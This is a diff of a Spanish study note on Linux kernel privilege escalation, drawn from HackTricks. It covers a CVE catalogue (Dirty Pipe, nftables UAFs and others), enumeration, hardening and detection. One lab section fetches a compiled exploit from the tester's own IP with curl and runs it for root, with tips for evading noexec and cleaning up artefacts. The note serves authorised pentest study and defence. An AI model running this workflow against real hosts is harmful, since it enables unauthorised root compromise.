@@ -1,70 +1,329 @@
 ---
-aliases: ["Vulnerabilidades del Kernel", "Escalada de Privilegios Linux"]
+aliases:
+  - Vulnerabilidades del Kernel
+  - Escalada de Privilegios Linux
+  - Kernel Exploitation
 tags:
-  - linux/seguridad
-  - hacking/escalada
-estado: 🟢 Terminado
+  - sec/priv-esc
+  - sec/linux
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]]"
+  - "[[Linux Capabilities]]"
+  - "[[Privilegios SUID en Linux]]"
+  - "[[Secuestro de Bibliotecas Compartidas]]"
+  - "[[Elevación de Privilegios mediante Explotación de Binarios]]"
+  - "[[Abuso de Permisos en Linux y LSE]]"
+  - "[[Abuso de Privilegios Sudoers]]"
+fuente: "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-kernel-exploitation.html"
 ---
 
 # Vulnerabilidades del Kernel y Escalada de Privilegios
 
-## ¿Qué es el Kernel?
+El **kernel** de Linux administra memoria, procesos, filesystem, red y dispositivos **con los máximos privilegios del sistema**. Cualquier bug alcanzable desde un proceso de usuario (syscall, ioctl, protocolo de red, filesystem montable) es un candidato a **escalada a root**: la frontera usuario/kernel es *la* frontera de seguridad del SO. En auditorías, la vía kernel es el escalón final cuando sudo/SUID/grupos/cron no dieron resultado.
 
-El **kernel** es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el kernel puede tener graves consecuencias para la seguridad del sistema.
+> [!info] Componentes clave del kernel
+> Subsistemas cuyos bugs se explotan con frecuencia:
+> *   **Scheduler**: reparto de CPU y tiempos (*race windows* para UAF/TOCTOU).
+> *   **Administrador de memoria**: allocación de páginas, copy-on-write, GUP (*get_user_pages*) — origen de Dirty COW y Dirty Pipe.
+> *   **Sistema de Archivos Virtual (VFS)** y fs montables (overlayfs, FUSE, ntfs-3g) — bugs de permisos/copy-up.
+> *   **Netfilter / stack de red** (`nftables`, `AF_PACKET`, DCCP, TIPC) — la cantera más productiva de UAF/double-free (CVE-2021-22555, CVE-2024-1086).
+> *   **Drivers / ioctls**: superficie enorme y de código de terceros.
+> *   **eBPF / io_uring**: APIs modernas, alto poder y bugs de verificador/gestión de memoria.
+> *   **Namespaces y cgroups**: lo que convierte un "bug de container" en root del host (CVE-2022-0492).
 
-> [!info] Componentes Clave del Kernel
-> El kernel de Linux se compone de varios subsistemas principales, incluyendo:
-> *   **Administrador de Procesos (Scheduler)**: Gestiona la ejecución de los procesos y la asignación de tiempo de CPU.
-> *   **Administrador de Memoria**: Controla la asignación y desasignación de memoria a los procesos, incluyendo la memoria virtual.
-> *   **Sistema de Archivos Virtual (VFS)**: Proporciona una interfaz unificada para diferentes sistemas de archivos.
-> *   **Controladores de Dispositivo**: Permiten la interacción con el hardware.
-> *   **Subsistema de Red**: Gestiona las comunicaciones de red.
-> Una vulnerabilidad en cualquiera de estos subsistemas puede ser crítica.
+## Mecánica: qué es realmente "rootear el kernel"
 
-## Vulnerabilidades del Kernel
+El kernel corre en modo privilegiado (ring 0) y todos los procesos comparten su espacio. Los exploits de escalada no "rompen el kernel" al estilo usuario: **corrompen una estructura de datos o un flujo de control y luego lo usan para reescribir lo que decide privilegios**. Los tres objetivos clásicos:
 
-En versiones antiguas del kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (**root**) en el sistema.
+| Objetivo | Qué se consigue | Ejemplos |
+|---|---|---|
+| **`struct cred` del proceso** (`real_cred`/`cred` en `task_struct`) | poner `uid=gid=…=0` en *mi* proceso → **root ya** | DirtyCred (reuso de cred tras free), ret2usr/ROP que lo escriben |
+| **`modprobe_path`** (`/proc/sys/kernel/modprobe`) | apuntar el helper de módulos a *mi* script → al fallar un módulo (socket de protocolo desconocido), el kernel **ejecuta mi binario como root** | UAF/write arbitrario → `trigger` con socket `AF_INET` protocolo roto |
+| **`core_pattern`** (`\|/ruta/al/script`) | el kernel ejecuta *mi* script como root al crashear un proceso | write arbitrario a la sysctl |
 
-> [!warning] Tipos Comunes de Vulnerabilidades del Kernel
-> Las vulnerabilidades del kernel no se limitan solo a versiones antiguas. Aunque las versiones modernas incorporan muchas mitigaciones, aún pueden surgir nuevos fallos. Algunos tipos comunes incluyen:
-> *   **Desbordamientos de Búfer (Buffer Overflows)**: Escribir más datos de los que un búfer puede contener, sobrescribiendo memoria adyacente.
-> *   **Uso Después de Liberar (Use-After-Free - UAF)**: Acceder a memoria que ha sido liberada y potencialmente reasignada para otro propósito.
-> *   **Condiciones de Carrera (Race Conditions)**: Fallos que ocurren cuando la salida de un programa depende de la secuencia o el tiempo de otros eventos incontrolables.
-> *   **Errores de Puntero Nulo (Null Pointer Dereferences)**: Intentar desreferenciar un puntero que apunta a `NULL`, lo que puede causar una denegación de servicio o, en ciertos contextos, ser explotable.
-> *   **Fugas de Información (Information Leaks)**: Exponer direcciones de memoria del kernel u otra información sensible que puede ayudar a eludir mitigaciones como ASLR.
+> [!warning] Tipos comunes de vulnerabilidades del kernel
+> (además de "solo en kernels viejos" — los modernos siguen teniendo nuevas):
+> *   **Desbordamientos de búfer**: escribir más de lo que un búfer puede contener y sobrescribir memoria adyacente (heap del kernel: `kmalloc`).
+> *   **Use-After-Free (UAF)**: usar un objeto ya liberado y potencialmente realocado — la clase dominante en netfilter/nftables.
+> *   **Double-free**: liberar dos veces → corrupción del *freelist* del slab.
+> *   **Condiciones de carrera**: la salida depende del timing entre hilos (Dirty COW: `madvise(DONTNEED)` vs GUP).
+> *   **Null pointer dereference**: desreferenciar `NULL`; en kernels viejos con `mmap(0)` explotable (hoy mitigado por `mmap_min_addr=65536`).
+> *   **Fugas de información**: leer punteros del kernel → eluden KASLR y permiten ROP dirigido.
 
-## Escalada de Privilegios
+Técnicas de explotación (cómo se llega de la corrupción a root):
 
-La elevación de privilegios se refiere a la técnica utilizada por los atacantes para obtener permisos elevados en el sistema, como superusuario (**root**), cuando solo tienen permisos limitados. Por ejemplo, un usuario con permisos limitados en el sistema podría utilizar una vulnerabilidad en el kernel para obtener acceso de superusuario y, posteriormente, comprometer el sistema.
+- **Ret2usr**: redirigir la ejecución del kernel a *shellcode* en espacio de usuario — **bloqueado por SMEP/SMAP** en hardware moderno.
+- **ROP (kernel)**: encadenar *gadgets* del propio kernel (saltos/cargas) eludiendo NX; requiere leak de direcciones (KASLR).
+- **Corrupción de estructuras**: sobrescribir punteros/cred para cambiar UID/GID a 0 (la vía más directa y la que usan los exploits modernos junto a `modprobe_path`).
 
-> [!info] Importancia de la Escalada de Privilegios
-> La escalada de privilegios es un paso crítico en la mayoría de los ataques avanzados. Un atacante que obtiene una shell inicial con bajos privilegios buscará inmediatamente una forma de escalar a `root` o `SYSTEM` (en Windows) para:
-> *   Instalar backdoors persistentes.
-> *   Acceder a datos sensibles de otros usuarios o del sistema.
-> *   Modificar la configuración del sistema o los logs para ocultar su presencia.
-> *   Pivotar a otras máquinas en la red con credenciales o hashes extraídos.
+## Catálogo de CVEs de escalada (familias clásicas)
 
-## Métodos de Explotación
+| CVE | Nombre | Alcance aproximado | Mecanismo / nota |
+|---|---|---|---|
+| **CVE-2016-5195** | **Dirty COW** | 2.6.22 → 4.8 (+backports) | carrera `madvise(DONTNEED)` vs *get_user_pages* → escribe sobre mappings de solo-lectura (binarios SUID, `passwd`) |
+| **CVE-2022-0847** | **Dirty Pipe** | 5.8 → 5.16.10 | flag `PIPE_BUF_FLAG_CAN_MERGE` sin inicializar en pipes → **sobrescribir páginas de archivos de solo-lectura** (SUID). Requiere un SUID candidato a sobrescribir |
+| **CVE-2021-3493** | overlayfs (Ubuntu) | kernels Ubuntu ≤5.11 | `setxattr` sobre overlay montado en user namespace → xattr de caps sin chequeo → root |
+| **CVE-2023-0386** | overlayfs copy-up | ≤ 6.2 | copiar con `copy_up` un archivo con caps entre namespaces → root en host (requiere userns sin privilegio) |
+| **CVE-2023-2640 / CVE-2023-32629** | **GameOverlay(lay)** | kernels Ubuntu (jul 2023) | overlayfs + userns de Ubuntu → caps sobre archivos del sistema |
+| **CVE-2022-0492** | cgroups v1 `release_agent` | ≤ 5.16 (feb 2022) | escribir `release_agent` desde un container con userns → **ejecución como root del host** (escape de container) |
+| **CVE-2022-0185** | fsconfig overflow | 5.1 → 5.16.1 | heap overflow en `fsconfig` (legacy_parse_param) vía userns |
+| **CVE-2021-22555** | netfilter OOB | 2.6.19 → 5.12 | heap OOB en `xt_compat` (iptables) — el exploit clásico de mirar |
+| **CVE-2022-32250** | nftables UAF | ≤ 5.18.1 | UAF en `nft_object` al recrear reglas |
+| **CVE-2023-32233** | nftables UAF | ≤ 6.3.1 | UAF en batch de anon sets — root con userns |
+| **CVE-2024-1086** | nftables UAF | 3.15 → 6.8-rc1 | UAF doble-free en `nft_verdict` — exploit público muy usado en labs (requiere userns) |
+| **CVE-2016-8655** | packet race | ≤ 4.8.12 | carrera en `AF_PACKET` (necesita `CAP_NET_RAW` — ver [[Linux Capabilities]]/userns) |
+| **CVE-2017-6074** | DCCP double-free | ≤ 4.9.13 | doble free en DCCP |
+| **CVE-2017-7308** | AF_PACKET | ≤ 4.10.6 | overflow en ring buffer de paquetes |
+| **CVE-2022-2588** | route4 UAF | 2022 | UAF en `cls_route` (qdisc) |
 
-Las vulnerabilidades del kernel pueden ser explotadas de varias maneras. Por ejemplo, un atacante podría aprovechar una vulnerabilidad en un controlador de dispositivo para obtener acceso al kernel y realizar operaciones maliciosas. Otra forma común en que se explotan las vulnerabilidades del kernel es mediante el uso de técnicas de desbordamiento de búfer, que permiten a los atacantes escribir código malicioso en áreas de memoria reservadas para el kernel.
+**Familia Qualys / userspace que toda auditoría revisa junto al kernel** (son SUID, no kernel, pero mismo flujo de trabajo):
 
-> [!tip] Desbordamientos de Búfer en el Kernel
-> Un desbordamiento de búfer en el contexto del kernel es particularmente peligroso. Si un atacante logra sobrescribir una dirección de retorno o un puntero de función dentro del espacio de memoria del kernel, podría redirigir la ejecución a su propio código malicioso. Este código, ejecutándose en modo kernel, tendría control total sobre el sistema. Las técnicas comunes incluyen:
-> *   **Ret2usr (Return-to-User)**: Redirigir la ejecución a código shellcode inyectado en el espacio de usuario.
-> *   **ROP (Return-Oriented Programming)**: Encadenar pequeños fragmentos de código existentes en el kernel (gadgets) para lograr la ejecución deseada, eludiendo la protección de no-ejecución (NX/DEP).
-> *   **Modificación de Estructuras de Datos del Kernel**: Alterar estructuras como `cred` o `task_struct` para cambiar los UID/GID de un proceso a 0 (root).
+| CVE | Nombre | Target |
+|---|---|---|
+| CVE-2021-4034 | **PwnKit** | `pkexec` (SUID) — ver [[Privilegios SUID en Linux]] |
+| CVE-2021-3156 | **Baron Samedit** | `sudo` heap overflow — ver [[Abuso de Privilegios Sudoers]] |
+| CVE-2023-4911 | **Looney Tunables** | `ld.so` (`GLIBC_TUNABLES`) en SUID — ver [[Secuestro de Bibliotecas Compartidas]] |
+| CVE-2024-48990/91/92 | **needrestart** | el análisis de `needrestart` corre como root y usa **el entorno de procesos de usuario** (`PYTHONPATH` y familia) → carga de código del atacante como root durante upgrades |
 
-## Mitigación
+## Enumeración: identificar el terreno
 
-Para mitigar el riesgo de vulnerabilidades del kernel, es importante mantener actualizado el sistema operativo y aplicar parches de seguridad tan pronto como estén disponibles.
+```bash
+# 1) Versión exacta del kernel (la base de todo)
+uname -a; uname -r
+cat /proc/version          # + versión de gcc/compilación — pista de backports
+cat /etc/os-release        # distro y versión (Ubuntu 22.04, Debian 12…)
+hostnamectl | grep -E 'Operating|Kernel'
 
-> [!info] Estrategias de Mitigación Avanzadas
-> Además de mantener el sistema actualizado, existen varias mitigaciones a nivel de kernel y sistema operativo diseñadas para dificultar la explotación:
-> *   **ASLR (Address Space Layout Randomization)**: Aleatoriza las direcciones de memoria de las bibliotecas, el stack y el heap para dificultar la predicción de direcciones.
-> *   **KASLR (Kernel Address Space Layout Randomization)**: Una variante de ASLR aplicada al kernel, aleatorizando la dirección base del kernel en cada arranque.
-> *   **DEP/NX (Data Execution Prevention/No-Execute)**: Marca las páginas de memoria como no ejecutables, impidiendo la ejecución de código desde áreas de datos (como el stack o el heap).
-> *   **SMEP (Supervisor Mode Execution Prevention)**: Impide que el kernel ejecute código en páginas de memoria marcadas como de usuario.
-> *   **SMAP (Supervisor Mode Access Prevention)**: Impide que el kernel acceda a datos en páginas de memoria marcadas como de usuario.
-> *   **Grsecurity/PaX**: Conjunto de parches de seguridad para el kernel de Linux que implementan una variedad de protecciones avanzadas.
-> *   **SELinux/AppArmor**: Módulos de seguridad que implementan control de acceso obligatorio (MAC) para restringir lo que los procesos pueden hacer, incluso si se comprometen.
-> A pesar de estas mitigaciones, los atacantes buscan constantemente nuevas formas de eludirlas, lo que subraya la importancia de la investigación continua y la aplicación de parches.
+# 2) Arquitectura y CPU (los exploits deben coincidir)
+uname -m                   # x86_64 / i686 / aarch64
+lscpu | grep -E 'Architecture|CPU\(s\):'   # nº de cores: carreras afinadas a 1-2 cores
+getconf LONG_BIT
+
+# 3) Configuración expuesta
+sysctl kernel.randomize_va_space kernel.kptr_restrict kernel.dmesg_restrict \
+        kernel.unprivileged_bpf_disabled kernel.unprivileged_userns_clone \
+        kernel.yama.ptrace_scope kernel.modules_disabled kernel.io_uring_disabled 2>/dev/null
+cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null   # Debian/Ubuntu
+cat /sys/kernel/security/lockdown 2>/dev/null                # none/integrity/confidentiality
+
+# 4) Módulos y superficie cargada
+lsmod | head -30; cat /proc/modules | awk '{print $1}'
+cat /boot/config-$(uname -r) 2>/dev/null | grep -E 'CONFIG_USER_NS|CONFIG_OVERLAY_FS|CONFIG_IKCONFIG|CONFIG_NF_TABLES|CONFIG_SLAB_FREELIST'
+zcat /proc/config.gz 2>/dev/null | grep CONFIG_USER_NS      # si IKCONFIG_PROC está activo
+
+# 5) Posición de privilegio de partida (condiciona qué CVE aplican)
+id; groups; sudo -l 2>/dev/null
+capsh --print 2>/dev/null | head -5        # caps de arranque (p. ej. CAP_NET_RAW → CVEs de red)
+```
+
+### Determinar vulnerabilidad: de la versión al exploit
+
+```bash
+# a) Búsqueda en BD local
+searchsploit linux kernel privilege escalation
+searchsploit --cve 2022-0847
+searchsploit ubuntu kernel 5.15          # filtrar por distro+versión
+searchsploit -w linux kernel local       # -w busca online si la BD local está vieja
+
+# b) Sugeridores automáticos (comparan uname con rangos de CVE)
+#   linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
+./les.sh
+
+# c) Confirmación manual (SIEMPRE antes de ejecutar):
+#   - el CVE aplica al rango de versiones de MI kernel (changelog oficial)
+#   - la distro no lo parcheó "silenciosamente" (backport) — comprobar:
+apt list --installed 2>/dev/null | grep linux-image     # versión de PAQUETE (5.15.0-91.101)
+apt changelog linux-image-$(uname -r) 2>/dev/null | grep -i CVE-2022-0847
+#   RHEL: rpm -q --changelog kernel | grep -A2 CVE-2022-0847
+```
+
+> [!tip] La pregunta de verificación
+> *"¿Mi `uname -r` está en el rango del CVE **y** el parche del vendor no está aplicado?"* — las distros **backportean** parches manteniendo el número base (Ubuntu `5.4.0-150-generic` lleva años de parches). El sugeridor automático es un **triage**, nunca una confirmación.
+
+## Patrón de ejecución de un exploit (lab)
+
+> [!warning] Regla de laboratorio
+> Los exploits de kernel son **inestables**: un desajuste de versión, config o timing provoca **panic** del sistema. Ejecutar únicamente en **VM con snapshot**, nunca en el host ni en producción. Este vault documenta los comandos; el execution corresponde al entorno de laboratorio autorizado.
+
+```bash
+# 1) COMPILAR en local, contra arquitectura del target
+uname -m                                   # debe coincidir con el ELF del target
+gcc -o exploit exploit.c -static           # -static: sin dependencia de libc en el target
+#  si el exploit incluye cabeceras del kernel:
+#    sudo apt install linux-headers-$(uname -r)    (¡en el target, misma versión!)
+
+# 2) TRANSFERIR al target
+python3 -m http.server 8000                # en tu equipo
+curl http://<tu_ip>:8000/exploit -o /tmp/exploit       # en el target
+#  alternativas: base64 -d <<< '…' > /tmp/e ; scp ; cat < /dev/tcp (sin curl)
+#  si /tmp está noexec → /var/tmp, ~/ o /dev/shm
+
+# 3) EJECUTAR y verificar
+chmod +x /tmp/exploit
+/tmp/exploit                               # salida típica: "[+] root"
+id                                         # uid=0(root) ⇒ éxito
+# 2>/dev/null; ls -l /tmp/exploit... limpiar artefactos tras la prueba
+
+# 4) Flujo cuando NO hay exploit directo
+#    combo: CVE de container (overlay/cgroup) → escape → root del host
+#    combo: fuga de info (KASLR) + ROP → cred write → root
+```
+
+**Qué prueba un exploit antes de decidir**: versión de kernel, existencia de SUID (Dirty Pipe necesita uno), userns habilitado, nº de cores, mitigaciones activas (SMEP/SMAP/KPTI) — la mayoría de exploits modernos los comprueban y salen limpios ("kernel not vulnerable") sin romper nada; los viejos, no.
+
+## Superficie de ataque desde contenedores
+
+Un container **comparte el kernel** del host: cualquier syscall permitida es superficie de ataque contra él.
+
+| Condición | Qué desbloquea |
+|---|---|
+| `--privileged` / `CAP_SYS_ADMIN` | overlayfs, cgroups, `release_agent` (CVE-2022-0492), mounts → escape |
+| User namespaces habilitados | ≈ mitad de los CVEs anteriores son alcanzables **sin privilegios** (nftables, overlay, fsconfig) |
+| seccomp desactivado | ioctls/protocols (DCCP, packet) que el perfil por defecto bloquea |
+| Kernel viejo del host | el container hereda **todos** sus CVEs — "dentro del container soy root y aún así el host es vulnerable" |
+
+Perfil por defecto de Docker bloquea muchas de estas syscalls vía seccomp; el detalle completo de escapes está en [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]].
+
+## Detección (lado defensor)
+
+| Señal | Cómo mirarla |
+|---|---|
+| Panic/oops/crash | `journalctl -k | grep -iE 'oops|bug|unable to handle|call trace'`; `/var/crash`, kdump (`/var/lib/systemd/coredump`); alerta de disponibilidad = intento fallido |
+| Binario de exploit en disco | FIM/EDR: ELF en `/tmp`, `/dev/shm`, `/home` ejecutado y borrado; `auditctl -a always,exit -S execve -F dir=/tmp -k tmp_exec` |
+| Ejecución sospechosa de `gcc`/`make` en el servidor | `ausearch -k compile`; builds inesperados en host productivo |
+| Carga de módulos inesperada | `ausearch` sobre `finit_module`/`init_module`; diff de `/proc/modules`; `modules_disabled=1` elimina el vector |
+| Trigger de `modprobe` anómalo | aparición de `/tmp/...` en logs de `modprobe` (señal de intento de *modprobe_path* overwrite) |
+| Escrituras a sysctls críticas | `auditctl -w /proc/sys/kernel/modprobe -p wa`; `…/core_pattern -p wa` |
+| needrestart/upgrade con entorno de usuario | parchear; ejecutar upgrades con entorno limpio |
+
+Artefactos típicos: `exploit.c`/`*.ko` en `/tmp`, procesos con `mmap(0)` o `iopl`, floods de `socket(AF_INET, SOCK_RAW/…)` en audit, llamadas fallidas a `unshare`, errores de `fsconfig`/`nft` en logs.
+
+## Impacto
+
+- **Root completo y persistente**: rewrite de `cred` → backdoor (`authorized_keys`, usuario uid 0, cron).
+- **Evasión total de DAC/MAC a nivel usuario**: root ignora permisos de archivo; SELinux/AppArmor pueden seguir activos (root ≠ omnipotente si hay MAC estricta).
+- **Escape de container** → compromiso del host y del clúster (ripple).
+- **Control del kernel**: rootkit (`CAP_SYS_MODULE`/insmod), ocultación de procesos, interceptación de tráfico — ver [[Linux Capabilities]] para la variante "sin bug, con caps".
+- **DoS**: el intento fallido deja el host caído — también es impacto.
+
+## Mitigación / sección defensiva
+
+```bash
+# 1) PARCHEAR — y entender que el parche NO afecta al kernel en memoria:
+apt update && apt full-upgrade -y && reboot     # el reboot es obligatorio…
+#  …salvo livepatch, que parchea el kernel en caliente:
+#  Ubuntu: canonical-livepatch enable <token> ; RHEL: dnf kpatch-patch ; upstream kpatch
+canonical-livepatch status
+uname -r                                         # tras livepatch: [patched] en el status
+
+# 2) CERRAR SUPERFICIE POR SYSCTL (persistir en /etc/sysctl.d/)
+sysctl -w kernel.unprivileged_userns_clone=0                 # Debian/Ubuntu
+sysctl -w user.max_user_namespaces=0                         # genérico (afecta a CVEs userns)
+sysctl -w kernel.apparmor_restrict_unprivileged_userns=1     # Ubuntu 23.10+
+sysctl -w kernel.unprivileged_bpf_disabled=2                 # mata eBPF sin caps
+sysctl -w kernel.io_uring_disabled=2                         # superficie nueva frecuente
+sysctl -w kernel.kptr_restrict=2                             # sin punteros kernel
+sysctl -w kernel.dmesg_restrict=1                            # sin dmesg → menos leaks
+sysctl -w kernel.perf_event_paranoid=2                       # perf sin caps
+sysctl -w kernel.yama.ptrace_scope=1                         # ptrace restringido
+sysctl -w kernel.modules_disabled=1                          # sin carga de módulos (¡hasta reboot!)
+sysctl -w kernel.sysrq=0
+sysctl -w fs.protected_hardlinks=1 fs.protected_symlinks=1
+
+# 3) CONFIG DEL KERNEL (hardening)
+#    CONFIG_STATIC_USERMODEHELPER=y   → fija el binario de usermode helpers
+#                                        (bloquea modprobe_path/core_pattern como objetivo)
+#    CONFIG_SECURITY_LOCKDOWN_LSM, init_on_alloc=1/init_on_free=1 (slab hygiene)
+#    CONFIG_RANDOMIZE_BASE (KASLR), SMEP/SMAP en CPU + Secure Boot
+cat /sys/kernel/security/lockdown     # esperado: [integrity] o confidentiality
+
+# 4) CONTENEDORES (reducir el ataque al kernel compartido)
+#    perfil seccomp por defecto ON, NO --privileged, drop CAP_SYS_ADMIN,
+#    user namespaces solo donde se necesiten — ver nota Docker
+
+# 5) DETECCIÓN Y RESPUESTA
+auditctl -w /proc/sys/kernel/modprobe -p wa -k modprobe_write
+auditctl -w /proc/sys/kernel/core_pattern -p wa -k corepattern_write
+journalctl -k | grep -iE 'oops|bug:|call trace'   # monitoreo de panics
+# + inventario: dpkg/apt changelog de kernel en el plan de parcheo con SLA
+```
+
+Resumen de mitigaciones **contra la explotación** (qué dificultan qué):
+
+| Mitigación | Efecto |
+|---|---|
+| **ASLR** | aleatoriza libs/stack/heap de usuario |
+| **KASLR** | aleatoriza la base del kernel → ROP necesita leak |
+| **DEP/NX** | no ejecución de páginas de datos (stack/heap) |
+| **SMEP** | el kernel no ejecuta páginas de usuario (mata ret2usr) |
+| **SMAP** | el kernel no *lee* datos de usuario (completa SMEP) |
+| **KPTI** | separa tablas de página usuario/kernel (meltdown/fugas) |
+| **slab hardening** | `init_on_alloc/free`, freelist random/hardened → UAF más difícil |
+| **SELinux/AppArmor + lockdown** | hasta a root le niegan acciones |
+| **Grsecurity/PaX** | parches de hardening upstream-complementarios |
+
+## Errores comunes
+
+1. **Confiar ciegamente en `linux-exploit-suggester`** — backports del vendor hacen **falsos positivos** el 50% de las veces; verificar changelog/paquete (`apt list | grep linux-image`, `rpm -q --changelog kernel`).
+2. **Arquitectura equivocada** — compilar en x86_64 y ejecutar en i686 (o al revés): `Exec format error`. Comprobar `uname -m` **en el target**.
+3. **Versión "parecida" pero no exacta** — `5.4.0-81` ≠ `5.4.0-150`: un exploit que asume offsets internos de estructuras (`cred`, `task_struct`) falla o pánica si el build no coincide.
+4. **Olvidar que parchear no reemplaza al reboot** — el kernel vivo sigue siendo el viejo hasta `reboot` (o livepatch). "Ya lo actualicé" sin reboot = sigue vulnerable.
+5. **Explorar sin mirar la config** — userns desactivado, nf_tables ausente o mitigaciones activas invalidan CVEs completos: `searchsploit` no lo dice.
+6. **Dirty Pipe sin SUID candidato** — el exploit necesita un binario SUID (u otro archivo de solo-lectura con valor) para sobrescribir; en distros con ~5 SUID la elección importa.
+7. **Carreras y nº de cores** — exploits de `AF_PACKET`/Dirty COW afinados a 1-2 cores fallen en hosts de 32; los modernos avisan.
+8. **`/tmp` con `noexec`** → `Permission denied` al ejecutar; mover a `/dev/shm` o `$HOME`.
+9. **Pánica en producción** — un exploit de kernel en el host productivo es un incidente de disponibilidad; siempre lab/VM primero.
+10. **Creer que "root = tener todo"** — con MAC estricta (SELinux enforcing/lockdown) incluso root necesita reglas; y con `modules_disabled`/`STATIC_USERMODEHELPER` se pierden técnicas clásicas de persistencia.
+11. **Descartar la vía kernel demasiado pronto** — revisar primero userns + overlay/cgroup (containers) y Dirty Pipe/Dirty COW en kernels con rangos conocidos antes de meterse en ROP.
+
+## Cheatsheet
+
+```bash
+# Enumeración
+uname -a; uname -r; cat /etc/os-release; uname -m; id; groups
+sysctl kernel.unprivileged_userns_clone kernel.unprivileged_bpf_disabled \
+       kernel.kptr_restrict kernel.dmesg_restrict 2>/dev/null
+lsmod | head; cat /boot/config-$(uname -r) 2>/dev/null | grep -E 'USER_NS|OVERLAY'
+apt list --installed 2>/dev/null | grep linux-image      # versión real del paquete
+
+# Determinación
+searchsploit linux kernel privilege escalation ; searchsploit --cve 2022-0847
+./les.sh                                                  # linux-exploit-suggester
+apt changelog linux-image-$(uname -r) | grep -i <CVE>     # confirmar backport
+
+# Ejecución (lab con snapshot)
+gcc -o exploit exploit.c -static
+python3 -m http.server 8000  ;  curl http://<ip>:8000/exploit -o /tmp/exploit
+chmod +x /tmp/exploit && /tmp/exploit && id               # uid=0 ⇒ éxito
+
+# Mitigación
+apt full-upgrade -y && reboot          # o: canonical-livepatch
+sysctl -w kernel.unprivileged_userns_clone=0 user.max_user_namespaces=0 \
+       kernel.unprivileged_bpf_disabled=2 kernel.kptr_restrict=2 \
+       kernel.dmesg_restrict=1 kernel.modules_disabled=1
+auditctl -w /proc/sys/kernel/modprobe -p wa -k modprobe_write
+```
+
+## Referencias
+
+- HackTricks — Kernel exploitation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-kernel-exploitation.html
+- PayloadsAllTheThings — Linux kernel: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation
+- Exploit Database: https://www.exploit-db.com/  ·  NVD: https://nvd.nist.gov/
+- `capabilities`/sysctls y hardening del kernel: https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html
+- linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
+- Qualys advisories (PwnKit, Baron Samedit, needrestart): https://www.qualys.com/en-us/security-advisories/
+- Notas internas: [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]], [[Elevación de Privilegios mediante Explotación de Binarios]]
+
+## Relacionadas
+
+- [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]] — ataque al kernel compartido desde dentro
+- [[Elevación de Privilegios mediante Explotación de Binarios]] — la misma disciplina de explotación aplicada a bins de usuario
+- [[Privilegios SUID en Linux]] — los CVEs userspace (PwnKit, etc.) que acompañan a esta nota
+- [[Abuso de Privilegios Sudoers]] — Baron Samedit en contexto
+- [[Secuestro de Bibliotecas Compartidas]] — Looney Tunables: el cargador como blanco
+- [[Linux Capabilities]] — `CAP_NET_RAW`/`CAP_SYS_ADMIN` como acceso previo a superficies de red/cgroups
+- [[Abuso de Permisos en Linux y LSE]] — punto de entrada de la enumeración antes de plantearte el kernel
